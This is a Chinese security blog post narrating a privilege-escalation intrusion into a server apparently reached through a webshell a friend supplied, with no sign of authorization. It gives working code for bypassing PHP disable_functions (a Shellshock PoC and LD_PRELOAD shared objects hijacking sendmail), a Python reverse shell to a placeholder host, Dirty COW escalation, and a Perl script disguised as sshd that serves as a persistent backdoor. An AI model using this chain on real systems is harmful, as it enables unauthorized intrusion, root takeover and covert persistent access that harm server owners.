<!DOCTYPE html>
<html lang="en">

<head>
    
<meta charset="utf-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">


<title>一次艰难的渗透提权过程 - F0rmat的博客 | 专注于网络攻防和信息安全</title>

<meta name="description" content="0x01 前言 某日朋友丢了一条shell叫我提权，我拿到shell看了一下，菜刀蚁剑都无法执行命令。 Getshell的漏洞分析在:https://getpass.cn/2019/09/06/An-APP-distribution-system-upload-vulnerability/
然后搞了好久熬了一个晚上才弄好，中间走了很多弯路。。。
0x02 信息探测 上一个phpinfo看下环境
PHP Version 5.6.30 disable_functions: passthru,exec,system,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru sendmail_path:/usr/sbin/sendmail -t -i mysql:	mysqlnd 5.0.11-dev - 20120503 宝塔警告！ 问了宝塔的开发工程师，宝塔确实是做得挺好的，Windows的基本没什么希望了，看下Linux的。 0x03 肝 putenv这个没禁可以利用一下，看了P神的一篇文章：https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html http://www.exploit-db.com/exploits/35146/ 的POC
&amp;lt;?php # Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) # Google Dork: none # Date: 10/31/2014 # Exploit Author: Ryan King (Starfall) # Vendor Homepage: http://php.net # Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror # Version: 5.* (tested on 5.6.2) # Tested on: Debian 7 and CentOS 5 and 6 # CVE: CVE-2014-6271  function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail." /><meta name="keywords"
  content="F0rmat, 信息安全, 网络安全, 红蓝攻防, 渗透测试, bypass, waf, 注入, 黑客" />


<link rel="stylesheet" href="https://getshe11.com/css/main.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/src/css/lightgallery.css">



<meta property="og:title" content="一次艰难的渗透提权过程" />
<meta property="og:description" content="0x01 前言 某日朋友丢了一条shell叫我提权，我拿到shell看了一下，菜刀蚁剑都无法执行命令。 Getshell的漏洞分析在:https://getpass.cn/2019/09/06/An-APP-distribution-system-upload-vulnerability/
然后搞了好久熬了一个晚上才弄好，中间走了很多弯路。。。
0x02 信息探测 上一个phpinfo看下环境
PHP Version 5.6.30 disable_functions: passthru,exec,system,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru sendmail_path:/usr/sbin/sendmail -t -i mysql:	mysqlnd 5.0.11-dev - 20120503 宝塔警告！ 问了宝塔的开发工程师，宝塔确实是做得挺好的，Windows的基本没什么希望了，看下Linux的。 0x03 肝 putenv这个没禁可以利用一下，看了P神的一篇文章：https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html http://www.exploit-db.com/exploits/35146/ 的POC
&lt;?php # Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) # Google Dork: none # Date: 10/31/2014 # Exploit Author: Ryan King (Starfall) # Vendor Homepage: http://php.net # Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror # Version: 5.* (tested on 5.6.2) # Tested on: Debian 7 and CentOS 5 and 6 # CVE: CVE-2014-6271  function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://getshe11.com/post/a-difficult-penetration-process/" />
<meta property="article:published_time" content="2019-09-09T02:11:19+00:00" />
<meta property="article:modified_time" content="2019-09-09T02:11:19+00:00" />
<meta itemprop="name" content="一次艰难的渗透提权过程">
<meta itemprop="description" content="0x01 前言 某日朋友丢了一条shell叫我提权，我拿到shell看了一下，菜刀蚁剑都无法执行命令。 Getshell的漏洞分析在:https://getpass.cn/2019/09/06/An-APP-distribution-system-upload-vulnerability/
然后搞了好久熬了一个晚上才弄好，中间走了很多弯路。。。
0x02 信息探测 上一个phpinfo看下环境
PHP Version 5.6.30 disable_functions: passthru,exec,system,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru sendmail_path:/usr/sbin/sendmail -t -i mysql:	mysqlnd 5.0.11-dev - 20120503 宝塔警告！ 问了宝塔的开发工程师，宝塔确实是做得挺好的，Windows的基本没什么希望了，看下Linux的。 0x03 肝 putenv这个没禁可以利用一下，看了P神的一篇文章：https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html http://www.exploit-db.com/exploits/35146/ 的POC
&lt;?php # Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) # Google Dork: none # Date: 10/31/2014 # Exploit Author: Ryan King (Starfall) # Vendor Homepage: http://php.net # Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror # Version: 5.* (tested on 5.6.2) # Tested on: Debian 7 and CentOS 5 and 6 # CVE: CVE-2014-6271  function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.">
<meta itemprop="datePublished" content="2019-09-09T02:11:19+00:00" />
<meta itemprop="dateModified" content="2019-09-09T02:11:19+00:00" />
<meta itemprop="wordCount" content="914">



<meta itemprop="keywords" content="渗透测试,提权," />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="一次艰难的渗透提权过程"/>
<meta name="twitter:description" content="0x01 前言 某日朋友丢了一条shell叫我提权，我拿到shell看了一下，菜刀蚁剑都无法执行命令。 Getshell的漏洞分析在:https://getpass.cn/2019/09/06/An-APP-distribution-system-upload-vulnerability/
然后搞了好久熬了一个晚上才弄好，中间走了很多弯路。。。
0x02 信息探测 上一个phpinfo看下环境
PHP Version 5.6.30 disable_functions: passthru,exec,system,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru sendmail_path:/usr/sbin/sendmail -t -i mysql:	mysqlnd 5.0.11-dev - 20120503 宝塔警告！ 问了宝塔的开发工程师，宝塔确实是做得挺好的，Windows的基本没什么希望了，看下Linux的。 0x03 肝 putenv这个没禁可以利用一下，看了P神的一篇文章：https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html http://www.exploit-db.com/exploits/35146/ 的POC
&lt;?php # Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) # Google Dork: none # Date: 10/31/2014 # Exploit Author: Ryan King (Starfall) # Vendor Homepage: http://php.net # Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror # Version: 5.* (tested on 5.6.2) # Tested on: Debian 7 and CentOS 5 and 6 # CVE: CVE-2014-6271  function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail."/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->
</head>

<body>
    <div class="header-placeholder"></div>
    
    <header class="header">
        <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    
    <a class="site-title" href="https://getshe11.com/.">F0rmat</a>
    
    <nav class="site-nav">
        <a class="page-link" href="/">Home</a><a class="page-link" href="/post/">Category</a>
    </nav>
</div>

    </header>

    
    <div class="page-content">
        <div class="wrapper">
            
            <div class="col-main">
                <div class="post">
    
    <header class="post-header">
        <h1 class="post-title">一次艰难的渗透提权过程</h1>
        <p class="post-meta">Sep 09, 2019</p>
    </header>
    <article class="post-content">
        
        
        
        
        
        
        <h1 id="0x01-前言">0x01 前言</h1>
<p>某日朋友丢了一条shell叫我提权，我拿到shell看了一下，菜刀蚁剑都无法执行命令。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/1.png" alt=""></p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/2.png" alt=""></p>
<p>Getshell的漏洞分析在:https://getpass.cn/2019/09/06/An-APP-distribution-system-upload-vulnerability/</p>
<p>然后搞了好久熬了一个晚上才弄好，中间走了很多弯路。。。</p>
<h1 id="0x02-信息探测">0x02 信息探测</h1>
<p>上一个phpinfo看下环境</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">PHP Version 5.6.30
disable_functions:
passthru,exec,system,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru
sendmail_path:/usr/sbin/sendmail -t -i
mysql:	mysqlnd 5.0.11-dev - 20120503
</code></pre></div><p>宝塔警告！
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/3.png" alt=""></p>
<p>问了宝塔的开发工程师，宝塔确实是做得挺好的，Windows的基本没什么希望了，看下Linux的。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/4.png" alt=""></p>
<h1 id="0x03-肝">0x03 肝</h1>
<p><code>putenv</code>这个没禁可以利用一下，看了P神的一篇文章：https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html
<a href="http://www.exploit-db.com/exploits/35146/">http://www.exploit-db.com/exploits/35146/</a> 的POC</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> 
<span class="c1"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) 
</span><span class="c1"># Google Dork: none 
</span><span class="c1"># Date: 10/31/2014 
</span><span class="c1"># Exploit Author: Ryan King (Starfall) 
</span><span class="c1"># Vendor Homepage: http://php.net 
</span><span class="c1"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror 
</span><span class="c1"># Version: 5.* (tested on 5.6.2) 
</span><span class="c1"># Tested on: Debian 7 and CentOS 5 and 6 
</span><span class="c1"># CVE: CVE-2014-6271 
</span><span class="c1"></span>
<span class="k">function</span> <span class="nf">shellshock</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Execute a command via CVE-2014-6271 @mail.c:283 
</span><span class="c1"></span>   <span class="nv">$tmp</span> <span class="o">=</span> <span class="nx">tempnam</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="s2">&#34;data&#34;</span><span class="p">);</span> 
   <span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;PHP_LOL=() { x; }; </span><span class="si">$cmd</span><span class="s2"> &gt;</span><span class="si">$tmp</span><span class="s2"> 2&gt;&amp;1&#34;</span><span class="p">);</span> 
   <span class="c1">// In Safe Mode, the user may only alter environment variableswhose names 
</span><span class="c1"></span>   <span class="c1">// begin with the prefixes supplied by this directive. 
</span><span class="c1"></span>   <span class="c1">// By default, users will only be able to set environment variablesthat 
</span><span class="c1"></span>   <span class="c1">// begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, 
</span><span class="c1"></span>   <span class="c1">// PHP will let the user modify ANY environment variable! 
</span><span class="c1"></span>   <span class="nx">mail</span><span class="p">(</span><span class="s2">&#34;a@127.0.0.1&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;-bv&#34;</span><span class="p">);</span> <span class="c1">// -bv so we don&#39;t actuallysend any mail 
</span><span class="c1"></span>   <span class="nv">$output</span> <span class="o">=</span> <span class="o">@</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span> 
   <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span> 
   <span class="k">if</span><span class="p">(</span><span class="nv">$output</span> <span class="o">!=</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span> 
   <span class="k">else</span> <span class="k">return</span> <span class="s2">&#34;No output, or not vuln.&#34;</span><span class="p">;</span> 
<span class="p">}</span> 
<span class="k">echo</span> <span class="nx">shellshock</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;cmd&#34;</span><span class="p">]);</span> 
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/5.png" alt=""></p>
<p>没戏。。</p>
<p>继续肝。。。</p>
<h1 id="0x04-新希望-ld_preload">0x04 新希望 LD_PRELOAD</h1>
<p>上gayhub上面搜了一下看到了一篇不错的姿势https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</p>
<p>按照了里面的一段代码<code>bypass_disablefunc.c</code></p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define _GNU_SOURCE
</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span><span class="cp"></span>

<span class="n">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span> <span class="kt">void</span> <span class="n">preloadme</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">unsetenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">);</span>
    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">cmdline</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&#34;EVIL_CMDLINE&#34;</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="n">cmdline</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>编译了一下
然后上传调用文件php</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
    <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&#34;</span><span class="p">;</span>

    <span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;cmd&#34;</span><span class="p">];</span>
    <span class="nv">$out_path</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;outpath&#34;</span><span class="p">];</span>
    <span class="nv">$evil_cmdline</span> <span class="o">=</span> <span class="nv">$cmd</span> <span class="o">.</span> <span class="s2">&#34; &gt; &#34;</span> <span class="o">.</span> <span class="nv">$out_path</span> <span class="o">.</span> <span class="s2">&#34; 2&gt;&amp;1&#34;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &#34;</span> <span class="o">.</span> <span class="nv">$evil_cmdline</span> <span class="o">.</span> <span class="s2">&#34;&lt;/p&gt;&#34;</span><span class="p">;</span>

    <span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;EVIL_CMDLINE=&#34;</span> <span class="o">.</span> <span class="nv">$evil_cmdline</span><span class="p">);</span>

    <span class="nv">$so_path</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;sopath&#34;</span><span class="p">];</span>
    <span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;LD_PRELOAD=&#34;</span> <span class="o">.</span> <span class="nv">$so_path</span><span class="p">);</span>

    <span class="nx">mail</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">);</span>

    <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&#34;</span> <span class="o">.</span> <span class="nx">nl2br</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$out_path</span><span class="p">))</span> <span class="o">.</span> <span class="s2">&#34;&lt;/p&gt;&#34;</span><span class="p">;</span> 

    <span class="nx">unlink</span><span class="p">(</span><span class="nv">$out_path</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>利用的时候没回显，what？
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/6.png" alt=""></p>
<p>又找了一篇文章：https://www.cnblogs.com/leixiao-/p/10612798.html
还是利用unix的<code>LD_PRELOAD</code>和php的<code>putenv</code></p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp"></span><span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="kt">void</span> <span class="n">l3yx</span><span class="p">(){</span>
    <span class="n">unsetenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="n">getenv</span><span class="p">(</span><span class="s">&#34;_evilcmd&#34;</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div><p>利用php文件</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;_evilcmd=echo 1&gt;/root/tmp/222222&#34;</span><span class="p">);</span>
<span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;LD_PRELOAD=./evil.so&#34;</span><span class="p">);</span>
<span class="nx">mail</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">);</span>
</code></pre></div><p>执行后去刷新了一下目录，！！！！我去，成功了！</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/7.png" alt=""></p>
<p>但是这样执行代码总是有众多不便的，比如没有回显，把命令带参数执行的时候会报错等
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/8.png" alt=""></p>
<p>还得继续。。。</p>
<h1 id="0x05-柳暗花明又一村-centos">0x05 柳暗花明又一村-centos</h1>
<p>看了大佬一篇文章https://www.meetsec.cn/index.php/archives/44/</p>
<p>一个修复版的bypass.c,作者的解释：</p>
<blockquote>
<p>如果你是一个细心的人你会发现这里的bypass_disablefunc.c（来自github）和教程中提及的不一样，多出了使用for循环修改LD_PRELOAD的首个字符改成\0，如果你略微了解C语言就会知道\0是C语言字符串结束标记，原因注释里有：unsetenv(&ldquo;LD_PRELOAD&rdquo;)在某些Linux发行版不一定生效（如CentOS），这样一个小动作能够让系统原有的LD_PRELOAD环境变量自动失效</p>
</blockquote>
<p>然后从环境变量 EVIL_CMDLINE 中接收 bypass_disablefunc.php 传递过来的待执行的命令行。</p>
<p>用命令 gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc_x64.so 将 bypass_disablefunc.c 编译为共享对象 bypass_disablefunc_x64.so：</p>
<p>要根据目标架构编译成不同版本，在 x64 的环境中编译，若不带编译选项则默认为 x64，若要编译成 x86 架构需要加上 -m32 选项。</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define _GNU_SOURCE
</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span>

<span class="k">extern</span> <span class="kt">char</span><span class="o">**</span> <span class="n">environ</span><span class="p">;</span>

<span class="n">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span> <span class="kt">void</span> <span class="n">preload</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// get command line options and arg
</span><span class="c1"></span>    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">cmdline</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&#34;EVIL_CMDLINE&#34;</span><span class="p">);</span>

    <span class="c1">// unset environment variable LD_PRELOAD.
</span><span class="c1"></span>    <span class="c1">// unsetenv(&#34;LD_PRELOAD&#34;) no effect on some 
</span><span class="c1"></span>    <span class="c1">// distribution (e.g., centos), I need crafty trick.
</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">))</span> <span class="p">{</span>
                    <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
            <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">// executive command
</span><span class="c1"></span>    <span class="n">system</span><span class="p">(</span><span class="n">cmdline</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/9.png" alt=""></p>
<p>偶~sex!
后来作者确实改进了代码
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/10.png" alt="">
中间也发现了一篇不错的方法：https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/</p>
<h2 id="劫持getuid">劫持getuid()</h2>
<p>基本原理
前提是在Linux中已安装并启用sendmail程序。</p>
<p>php的mail()函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，而/usr/sbin/sendmail会调用getuid()。如果我们能通过LD_PRELOAD的方式来劫持getuid()，再用mail()函数来触发sendmail程序进而执行被劫持的getuid()，从而就能执行恶意代码了。</p>
<p>细化一下：</p>
<p>编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 evil.so；
运行 PHP 函数 putenv()，设定环境变量 LD_PRELOAD 为 evil.so，以便后续启动新进程时优先加载该共享对象；
运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于上一步 LD_PRELOAD 的作用，sendmail 调用的系统函数 getuid() 被优先级更好的 evil.so 中的同名 getuid() 所劫持；
达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">int</span> <span class="nf">geteuid</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">cmdline</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&#34;EVIL_CMDLINE&#34;</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">getenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
        <span class="n">unsetenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">);</span>
        <span class="n">system</span><span class="p">(</span><span class="n">cmdline</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p><code>gcc -shared -fPIC bypass.c -o byapss.so</code> 编译了一下去利用，发现可以哦！</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/11.png" alt=""></p>
<h1 id="0x06-脏牛提权">0x06 脏牛提权</h1>
<p>可以执行命令了，执行上反弹shell，有交互的shell舒服多了，这里用python的反弹脚本，一般系统有装python脚本，我都会先用pyhton，因为有一些系统的不一样，bash或者nc比较麻烦。</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">os</span>
<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&#34;x.x.x.x&#34;</span><span class="p">,</span><span class="mi">7777</span><span class="p">))</span>
<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
<span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="s2">&#34;-i&#34;</span><span class="p">]);</span>
</code></pre></div><p>监听一波
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/12.png" alt="">
反弹成功了
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/13.png" alt=""></p>
<p>执行<code>uname -a</code>看了下版本</p>
<p>Linux cloud 2.6.32-642.el6.x86_64 #1 SMP Tue May 10 17:27:01 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</p>
<p>2.6的版本上脏牛必中，可以不用在目标机子上面编译，在自己的Linux环境编译然后上传到目标机子上面执行
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/14.png" alt=""></p>
<p>那就静静等待脏牛把root替换掉，然后脸上目标机子，大概要几分钟这样子，去连ssh的时候有些管理员会把ssh的端口改了，用命令<code>netstat -nlp</code>就可以看到了。</p>
<p>已经成功了，用户名为<code>firefart</code>密码是刚设置的123456。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/15.png" alt=""></p>
<p>已经成功登陆目标机子
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/16.png" alt=""></p>
<h1 id="0x07-持续访问-ssh后门">0x07 持续访问-ssh后门</h1>
<p>登陆目标机子后，记得及时恢复/etc/passwd</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">cp /tmp/passwd.bak /etc/passwd
</code></pre></div><p>看过一篇文章，觉得这个后门也不错，https://www.freebuf.com/articles/system/140880.html</p>
<p>那些pam补丁、隐藏文件、suid、inetd等都可以用作后门，看你环境。</p>
<ol>
<li>这个ssh 后门伪装成一个perl脚本，名为sshd，位于/usr/sbin/sshd , 将系统原先的sshd 移到/usr/bin下</li>
</ol>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/perl</span>
<span class="k">exec</span><span class="s2">&#34;/bin/sh&#34;</span><span class="k">if</span><span class="p">(</span><span class="n">getpeername</span><span class="p">(</span><span class="n">STDIN</span><span class="p">)</span><span class="o">=~/^..</span><span class="n">zf</span><span class="o">/</span><span class="p">);</span>
<span class="k">exec</span><span class="p">{</span><span class="s2">&#34;/usr/bin/sshd&#34;</span><span class="p">}</span><span class="s2">&#34;/usr/sbin/sshd&#34;</span><span class="p">,</span><span class="nd">@ARGV</span><span class="p">;</span>
</code></pre></div><ol start="2">
<li>将真正的sshd 移至/usr/bin/sshd</li>
</ol>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">mv /usr/sbin/sshd /usr/bin/sshd
</code></pre></div><ol start="3">
<li>将后门sshd (perl脚本移动至/usr/sbin/sshd),并授予执行权限</li>
</ol>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">chmod +x /usr/sbin/sshd 
</code></pre></div><ol start="4">
<li>重启 ssh 服务</li>
</ol>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">/etc/init.d/sshd restart
</code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/17.png" alt="">
